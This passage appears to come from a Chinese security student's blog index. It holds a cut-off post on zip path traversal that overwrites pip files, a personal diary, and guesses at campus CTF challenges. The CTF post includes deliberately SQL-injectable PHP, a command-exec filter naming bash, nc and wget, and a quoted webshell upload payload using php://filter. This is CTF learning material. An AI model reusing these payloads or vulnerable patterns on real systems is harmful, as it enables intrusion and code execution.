之中，这时内置的Python包位于/home/&lt;user&gt;/.local/lib/python2.7/site-packages/pip目录中\n假设目标应用运行在用户目录中，那么我们就可以构造类似../../.local/lib/python2.7/site-packages/pip/__init__.py之类的文件名\n如果目标应用使用的是 virtualenv，假设 virtualenv 的目录为 venv，那么我们就可以使用类似../venv/lib/python2.7/site-packages/pip/__init__.py之类的文件名\n这样处理后 pip 会受到影响，当下次服务器运行 pip 时就会执行我们的代码\n漏洞预防为了防御这个漏洞，你需要使用ZipFile.extract()来解压文件\n理论上也可以手动检查目录是否违法，但是太麻烦了，不如用ZipFile.extract()\n\n如果待处理文件使用的是绝对路径，那么路径中包含的驱动、UNC字符以及前缀（后缀）斜杠会被过滤掉，例如，在Unix上，&#x2F;&#x2F;&#x2F;foo&#x2F;bar经过处理后会变为foo&#x2F;bar，在Windows上，C:foobar经过处理后会变为foobar。文件名中包含的所有“..”字符会被移除，例如，..&#x2F;..&#x2F;foo..&#x2F;..&#x2F;ba..r会变成foo..&#x2F;ba..r。在Windows上的非法字符（:、&lt;、&gt;、|、”、?、以及*）会被替换为下划线（_）\n\n","tags":["web安全"]},{"title":"日记","url":"/2025/07/20/%E6%97%A5%E8%AE%B0/","content":"之前发在CSDN了，但是感觉这种东西发在CSDN太尴尬了，还是删了发在我自己的blog里吧\n最近鼠鼠也是来到上海打拼（实习）了，那么秉持着来都来了的原则，鼠鼠也是去bw逛了逛，虽说没票只能在外场看看😭。可惜几乎没有多少我非常喜欢的ip，不由感慨现在的二次元圈已经变样了。\n虽说我知道内场有邦邦的展台，但是令人感慨的是居然没有多少邦邦的cos，但是偶遇了一位cos猫猫的老师整整三次，外场一次地铁站一次地铁上一次，可惜出于我的社恐还是没有敢上去集邮😭社恐的毛病到底什么时候能改口牙。\n最近看了不少圈内师傅的blog，但是比起技术博客，我发现我还是更爱看大佬们分享日常，也是不由得心生写个日常的想法，但是回头一看，全是流水账，典型的工科思维（bushi\n为什么要写博客呢，一开始是看了我们学校特别强的一个师傅toka✌🏻的博客。那时我还很年轻，里面的内容都看不懂，但是却让我心生和toka✌🏻一样写博客的想法。开始学网安后，尤其是今年不断深入，又看了不少师傅的博客，正如上文所说，最爱看的还是师傅们的日常的分享，也是不得不感慨师傅们除了技术牛，文笔也是一流，不是我这种只会流水账的小垃圾能比的。\n其实对文学类作品我一直不太感兴趣，看过最多的和文学相关的也就是轻小说了。个人来说，除去二次元的成分，我更喜欢音乐。各种音乐我都会听，但是主要听的还是摇滚和朋克。就算不去看歌词，我也能从编曲中感受到想要表达的情感。只可惜练习吉他1.5坤年，还是不能像吉他大手子一样，在琴弦的振动中加入自己想表达的感情，在加上空闲时间越来越少，于是练习吉他的时间也越来越少了。\n话说回来，我最喜欢的音乐风格果然还是日摇。或多或少受到日本acg的影响，但其实我最开始听日摇不是因为木柜子乐队。我第一个喜欢的日摇乐队（其实也是我最开始听乐队）就是One ok Rock，或许有人会说后期oor的风格偏向了欧美风格，但是我确确实实受到早期oor作品的鼓舞和影响并不断的keep going。\n后来的结束乐队和无刺有刺的曲子我也是全部非常喜欢，但是最喜欢的果然还是Mygo!!!!!\n因为我其实是今年年初才开始看mygo的，当时的我也是非常迷茫，我开始怀疑自己读一个双非计算机的意义，但是当我看到诗超绊，看到灯说的那句“即使迷茫也要不断前进”，听到mygo的曲子的时候，我真的受到了很大的鼓舞，我不断前进不断前进，终于在大一的暑假就当上了牛马找到了实习（虽然是苦逼安服仔）\n最近不知道为什么也是迷上了看room tour类型的视频，看着他们或大或小的户型，别具巧心的装修，我也是超前点播，已经在梦里想好了将来的家长什么样，可惜一抬头，看到的还是我十几平的小破房\n躺在十几平的出租屋，一眼望到头的人生我是绝对不要的，所以说即使迷茫也要不断前进，要把理想的房子变成现实，然后我也拍一期room tour\n","tags":["随笔"]},{"title":"校赛题目推断","url":"/2025/08/08/%E6%A0%A1%E8%B5%9B%E9%A2%98%E7%9B%AE%E6%8E%A8%E6%96%AD/","content":"之前因为期末的原因没有去打，现在闲下来了突然想起来，但是现在已经不开放了，所以就进行一个通过题目名称猜测题目内容的活动，也是水一篇blog，顺便鉴定一下学长的成分（\n下面是题目列表\nMiscHTTPS怎么也不安全\t张静媛学姐的秘密文件\t段涵涵学姐最爱的音乐\t流量分析-1\t流量分析-2\t流量分析-3\t流量分析-4\t流量分析-5\t流量分析-6\t流量分析-7\t流量分析-8CryptoBase141\tRSA你太baby了\t愤怒的笑笑Webbusy_search\tcan_u_escape\tez?upload2\tez_upload\tgive!me!money!\tlottery签到重生版\tpop之我又双叒叕重生了\tu_know?\t函数重生版\t小猿口算签到重生版Reversemaze\tIDA\tXor\trere\tsw1f7&#x27;s TEA\tsw1f7&#x27;s XXTEAMobilease_androidOSINT杜浩学姐の朋友圈\t杜浩学姐の旅行\n\nMISC总体还是比较难猜，直接放弃\nWEB还是这个稍稍好猜一点点，能根据名字略知一二\nbusy_search看到这个想到的就是利用sql的慢查询\n&lt;?php$keyword = $_GET[&#x27;keyword&#x27;];$conn = mysqli_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;shop&quot;);$sql = &quot;SELECT * FROM products WHERE name LIKE &#x27;%$keyword%&#x27;&quot;;$result = mysqli_query($conn, $sql);while($row = mysqli_fetch_assoc($result))&#123;    echo $row[&#x27;name&#x27;] . &quot; - &quot; . $row[&#x27;price&#x27;] . &quot;&lt;br&gt;&quot;;&#125;?&gt;\n大概就是这样的感觉，再配一下表结构就差不多\ncan_u_escape炒冷饭喵，去年就出过，这次八成是又加了点过滤什么的\n&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;url&#x27;]))&#123;    $url=$_GET[&#x27;url&#x27;];    if(preg_match(&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\\-|\\*|\\&quot;|\\&gt;|\\&lt;|\\%|\\$/i&#x27;,$url))    &#123;        echo &quot;Sorry,you can&#x27;t use this.&quot;;    &#125;    else    &#123;        echo &quot;Can you see anything?&quot;;        exec($url);    &#125;&#125;\n\nez?upload2\tez_upload应该就是按照去年招新赛时候的出的，ez_upload多点过滤，ez?upload2原样不变，懒得拉样例出来了，就是普通的upload漏洞\n去年ez?upload2的wp是这样的：\n通过上传一句话木马（用蚁剑连接或者直接执行system命令也可以）来获取具体的版本信息和flag值。第一处绕过在文件头的检测，因为只检测了文件头，就可以利用gif的文件头来绕过检测，即在payload前先加上GIF87a或者GIF89a，这里选用GIF89a为例。我们初步构建一个payloaddata=GIF89a&lt;?php echo system(&quot;ls /&quot;);?&gt;接下来看下一个需要绕过的地方&lt;?php exit();?&gt;。这一段会自动接在文件之前导致代码执行异常。这时候用php://filter的base64-decode来对其进行解码，自动抛弃&lt;&gt;等字符，使代码失效。这里还需要注意，base64是8位一组进行解码，phpexit是7字节，所以还需要补上1字节（这里加个a）即payload–&gt;apayload由于开头还得是GIF89a，长度为6字节，所以还需补上2字节所以最终payload应为(补了3个a)：payload --&gt; GIF89aaaapayloaddata=GIF89aaaaR0lGODlhPD9waHAgZWNobyBzeXN0ZW0oImxzIC8iKTs/Pg%3d%3d&amp;filename=php://filter/write=convert.base64-decode/resource=./upload/aaa/123.php上传后访问路径，即可执行代码找到flag和提示即可解出flag\ngive!me!money!鉴定不太出来，但如果是我可能会效仿ISCC2025决赛那道web或者ciscn2021的一道（在buu上）\nlottery签到重生版众所周知，攻防世界有一道XCTF：lottery，八成是这个的魔改版本\n在原题用的是php的弱比较，魔改的话可能加个反序列化逻辑之类的？不太清楚呢\nu_know?   函数重生版这两个实在鉴定不出来\n小猿口算签到重生版这个八成是拿去年hackergame里的比大小王那道题改的，也可能没改（\n太复杂就不写demo了\nReverse逆向差不多和去年一样都没怎么改\nmaze迷宫题\nIDA八成是那个点击即送\nXorXor，不多解释了\nrere八成是个动调，毕竟全是静态不太合适\nsw1f7’s TEA\tsw1f7’s XXTEATEA加密系列，应该和去年的版本一样，虽说我去年就没在做（\nMobilease_android不会安卓逆向，开摆\nOSINT杜浩学姐の朋友圈\t杜浩学姐の旅行和去年俩个OSINT差不多的标题，不知道内容改没改\n","tags":["CTF"]}]